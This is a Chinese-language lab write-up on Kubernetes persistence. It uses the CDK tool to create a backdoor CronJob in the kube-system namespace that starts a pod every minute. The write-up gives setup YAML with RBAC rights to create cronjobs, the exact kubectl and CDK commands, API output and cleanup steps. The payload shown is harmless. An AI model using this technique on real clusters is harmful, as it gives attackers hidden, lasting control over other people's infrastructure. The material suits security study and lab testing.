# Kubernetes 部署后门 CronJob

## 漏洞描述

Cronjob 是 K8s 集群的一种资源，类似于 Linux 系统中的 cron 任务，可在指定的时间间隔内运行任务，创建一个或多个 Pod 副本。

在集群内获取到一定的权限，需要对当前的权限进行持久化控制时，可利用 K8s Cronjob 资源的特性，创建一个 kube-system 命名空间下的 Cronjob 资源，进行持久化控制。

参考链接：

- https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-cronjob
- https://github.com/cdk-team/CDK/blob/main/test/k8s_exploit_util/cronjob.yaml
- https://github.com/Metarget/metarget

## 环境搭建

基础环境准备（Docker + Minikube + Kubernetes），可参考 [Kubernetes + Ubuntu 18.04 漏洞环境搭建](https://github.com/Threekiii/Awesome-POC/blob/master/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md) 完成。

本例中各组件版本如下：

```
Docker version: 18.09.3
minikube version: v1.35.0
Kubectl Client Version: v1.32.3
Kubectl Server Version: v1.32.0
```

通过 yaml 文件创建漏洞环境：

```
kubectl apply -f k8s_metarget_namespace.yaml
kubectl apply -f k8s_backdoor_cronjob.yaml
```

执行完成后，K8s 集群内 `metarget` 命名空间下将会创建一个名为 `k8s-backdoor-cronjob` 的 pod：

```
kubectl get pods -n metarget
-----
NAME                   READY   STATUS    RESTARTS   AGE
k8s-backdoor-cronjob   1/1     Running   0          3m56s
```

![](images/Kubernetes%20部署后门%20CronJob/image-20250422135426486.png)

## 漏洞复现

> Kubernetes v1.21 及以上版本，`batch/v1beta1` 已被移除，可以使用 `batch/v1` 代替。

我们使用漏洞利用工具 [CDK](https://github.com/cdk-team/CDK)，将 `pkg/exploit/persistence/k8s_cronjob.go` 中的 `batch/v1beta1` 修改为 `batch/v1`，重新编译得到 `cdk_modified`，将其传入 `k8s-backdoor-cronjob` pod 中：

```
kubectl cp cdk_modified k8s-backdoor-cronjob:/ -n metarget
```

执行以下命令运行工具（该命令会每隔一分钟在 `kubs-system` 命名空间下创建一个 pod 执行指定命令）：

```
kubectl exec -n metarget -it k8s-backdoor-cronjob -- chmod +x /cdk_modified
kubectl exec -n metarget -it k8s-backdoor-cronjob -- /cdk_modified run k8s-cronjob default min ubuntu "touch /tmp/awesome_poc ; sleep 10000"
-----
2025/04/22 06:08:20 getting K8s api-server API addr.
	Find K8s api-server in ENV: https://10.96.0.1:443
2025/04/22 06:08:20 generate cronjob with 
 image:ubuntu
 cmd:touch /tmp/awesome_poc ; sleep 10000
 schedule:min
2025/04/22 06:08:20 requesting  /apis/batch/v1/namespaces/kube-system/cronjobs
2025/04/22 06:08:20 api-server response:
{"kind":"CronJob","apiVersion":"batch/v1","metadata":{"name":"cdk-backdoor-cronjob","namespace":"kube-system","uid":"45aed148-bfd3-4a2a-9593-77db015b74a4","resourceVersion":"15914","generation":1,"creationTimestamp":"2025-04-22T06:08:20Z","managedFields":[{"manager":"Go-http-client","operation":"Update","apiVersion":"batch/v1","time":"2025-04-22T06:08:20Z","fieldsType":"FieldsV1","fieldsV1":{"f:spec":{"f:concurrencyPolicy":{},"f:failedJobsHistoryLimit":{},"f:jobTemplate":{"f:spec":{"f:template":{"f:spec":{"f:containers":{"k:{\"name\":\"cdk-backdoor-cronjob-container\"}":{".":{},"f:args":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{}}},"f:dnsPolicy":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{}}}}},"f:schedule":{},"f:successfulJobsHistoryLimit":{},"f:suspend":{}}}}]},"spec":{"schedule":"* * * * *","concurrencyPolicy":"Allow","suspend":false,"jobTemplate":{"metadata":{"creationTimestamp":null},"spec":{"template":{"metadata":{"creationTimestamp":null},"spec":{"containers":[{"name":"cdk-backdoor-cronjob-container","image":"ubuntu","args":["/bin/sh","-c","touch /tmp/awesome_poc ; sleep 10000"],"resources":{},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"OnFailure","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","securityContext":{},"schedulerName":"default-scheduler"}}}},"successfulJobsHistoryLimit":3,"failedJobsHistoryLimit":1},"status":{}}
```

![](images/Kubernetes%20部署后门%20CronJob/image-20250422141541628.png)

验证部署结果：

```
kubectl get cronjobs -n kube-system
-----
NAME                   SCHEDULE    TIMEZONE   SUSPEND   ACTIVE   LAST SCHEDULE   AGE
cdk-backdoor-cronjob   * * * * *   <none>     False     2        7s              107s
```

![](images/Kubernetes%20部署后门%20CronJob/image-20250422141257013.png)

查看通过 cronjobs 在 `kubs-system` 命名空间下的 pod：

```
kubectl get pods -n kube-system
-----
NAME                                  READY   STATUS    RESTARTS       AGE
cdk-backdoor-cronjob-29088369-f9nq5   1/1     Running   0              11m
cdk-backdoor-cronjob-29088370-nl6bg   1/1     Running   0              10m
cdk-backdoor-cronjob-29088371-gzggb   1/1     Running   0              9m22s
...
```

![](images/Kubernetes%20部署后门%20CronJob/image-20250422142314469.png)

## 环境复原

```
kubectl delete cronjob cdk-backdoor-cronjob -n kube-system
kubectl delete -f k8s_backdoor_cronjob.yaml
kubectl delete -f k8s_metarget_namespace.yaml
```

## YAML

[k8s_metarget_namespace.yaml](https://github.com/Metarget/metarget/blob/master/yamls/k8s_metarget_namespace.yaml)

```
apiVersion: v1
kind: Namespace
metadata:
  name: metarget
```

[k8s_backdoor_cronjob.yaml](https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/k8s_backdoor_cronjob.yaml)

```
apiVersion: v1
kind: ServiceAccount
metadata:
  name: k8s-backdoor-cronjob
  namespace: metarget
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: k8s-backdoor-cronjob
rules:
- apiGroups:
  - batch
  resources:
  - cronjobs
  verbs:
  - create
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: k8s-backdoor-cronjob
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: k8s-backdoor-cronjob
subjects:
- kind: ServiceAccount
  name: k8s-backdoor-cronjob
  namespace: metarget
---
apiVersion: v1
kind: Pod
metadata:
  name: k8s-backdoor-cronjob
  namespace: metarget
spec:
  serviceAccountName: k8s-backdoor-cronjob
  containers:
  - name: ubuntu
    image: ubuntu:latest
    imagePullPolicy: IfNotPresent
    # Just spin & wait forever
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
```
